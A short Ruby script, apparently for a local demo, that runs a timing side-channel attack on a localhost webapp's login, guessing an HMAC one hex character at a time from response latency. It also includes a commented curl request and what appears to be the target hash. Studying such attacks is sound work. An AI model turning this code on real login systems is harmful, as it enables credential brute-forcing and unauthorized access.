# this is a client that will try to login to the webapp.
# the roundtrip time for the request and password attempted will be logged for analysis
# it will brute force password
require 'net/http'
require 'hitimes'
require './distribution'

class Client
  attr_accessor :url
  def initialize(url)
    self.url=URI(url)
  end
  def login(password)
    res = Net::HTTP.post_form(url, 'username' => 'eggie5',
      'hash_challenge' => password)
  end
end


def time
  now = Time.now.to_f
  yield
  endd = Time.now.to_f
  endd - now
end


client=Client.new("http://127.0.0.1:4567/timing_attack")

dataset={}
number_of_times=200
trials=[]
dist=Distribution.new


hmac = "f500000000000000000000000000000000000000"

(2..2).each do |i|
  
  number_of_times.times do |k| # try each byte 25 times to find slowest one statisticly
    (0..15).each {|i|dataset["%1x" % i]=[]} #reset
    (0..15).each do |j|
      hmac[i] = byte = "%1x" % j
      resp=""
      duration = Hitimes::Interval.measure do
        resp=client.login(hmac).body
      end

      dataset[byte].push duration
      #p "#{hmac} - #{resp} - #{duration}"
    end
    
    #calc rank here and populate distribution table
    _sorted=dataset.sort_by{|k,v| v }.reverse! #sorted slowest first
    _sorted.each_with_index do |k, i|
      dist[k[0]].push i
    end

  end
end


p dist.sorted_avg
# dist.each do |k,v|
#   puts "#{k} - #{v.sort} - mean=#{v.mean}"
# end
# dd=dataset.sort_by{|k,v| v.median }
# 
# dd.reverse.each do |k, ds|
#   p "#{k} median = #{ ds.median }, deviation=#{ds.deviation}"
# end

#curl -v -d "username=eggie5&hash_challenge=0300000000000000000000000000000000000000" http://localhost:4567/timing_attack
#f5acdffbf0bb39b2cdf59ccc19625015b33f55fe